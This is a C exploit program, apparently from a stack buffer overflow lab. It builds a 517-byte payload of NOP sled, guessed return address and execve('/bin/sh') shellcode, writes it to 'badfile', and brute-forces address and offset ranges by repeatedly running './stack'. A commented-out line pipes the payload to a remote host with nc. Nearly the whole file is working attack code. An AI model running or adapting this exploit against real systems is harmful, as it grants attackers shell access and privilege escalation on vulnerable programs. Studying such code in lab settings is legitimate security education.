/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    //"\x31\xc0" /* Line 1: xorl %eax,%eax */
    //"\x31\xdb" /* Line 2: xorl %ebx,%ebx */
    //"\xb0\xd5" /* Line 3: movb $0xd5,%al */
    //"\xcd\x80" /* Line 4: int $0x80 */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv)
{
    unsigned int buffer_S;
    unsigned int buffer_E;
    int distance_S;
    int distance_E;
    if(argc < 2) {
        printf("need more arguments.\n");
        return;
    }

    sscanf(argv[1], "%X", &buffer_S);
    sscanf(argv[2], "%X", &buffer_E);
    distance_S = atoi(argv[3]);
    distance_E = atoi(argv[4]);
    //printf("%lld %d\n", bufferStartPoint, distance);
    char buffer[517];
    for(unsigned int bufferStartPoint= buffer_S;bufferStartPoint<=buffer_E;bufferStartPoint+=4){
         for(unsigned int distance=distance_S ;distance<=distance_E;distance+=4){
    FILE *badfile;
    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    //fill the return address, becausethe return address is 
    //4byte above ebp, we need to add 4 to the distance
    * ((long *) (buffer + distance + 4)) = bufferStartPoint + distance + 0x80;

    //place shellcode to the en of the buffer
    memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
    //system("cat badfile | nc 10.0.2.71 9090");
    system("./stack");
        }
    }
}